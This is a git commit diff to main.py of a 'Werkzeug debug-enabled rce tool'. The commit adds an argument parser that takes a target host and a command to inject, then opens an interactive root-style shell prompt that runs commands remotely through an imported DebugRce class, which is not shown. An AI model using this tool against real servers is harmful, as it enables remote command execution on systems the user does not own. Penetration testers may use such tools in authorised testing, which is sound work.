e72ce9e6637f7b190b94f807240d5a849c5e1fda
its0x08 <m.thg@icloud.com>
2022-08-02 15:18:36 +0200

    chore: Add argument parser

--- main.py
+++ main.py
@@ -1,17 +1,29 @@
 #!/usr/bin/env python
-'''werkzeug debug-enabled rce tool'''
-from sys import argv, exit as sysexit
+'''Werkzeug debug-enabled rce tool'''
+
+from argparse import ArgumentParser
+from sys import exit as sysexit, argv
+
 from werkzeug_rce import DebugRce
 
 if __name__ == '__main__':
-	d = DebugRce(argv[1])
-	d.exec(argv[2])
+
+	parser = ArgumentParser()
+	parser.add_argument('-t', '--host', type=str,
+						required=True, help='Target host to test')
+	parser.add_argument('-c', '--cmd', type=str,
+						required=True, help='Cmd to inject')
+	args = parser.parse_args()
+	
+	d = DebugRce(args.host)
+	for line in d.exec(args.cmd):
+		print(line)
 
 	while True:
 		try:
-			cmd = input(f'root@{argv[1]}:~$ ')
+			cmd = input(f'root@{args.host}:~$ ')
 			for line in d.exec(cmd):
 				print(line)
 		except KeyboardInterrupt:
-			print('\nQuiting!')
+			print('\nQuitting!')
 			sysexit()
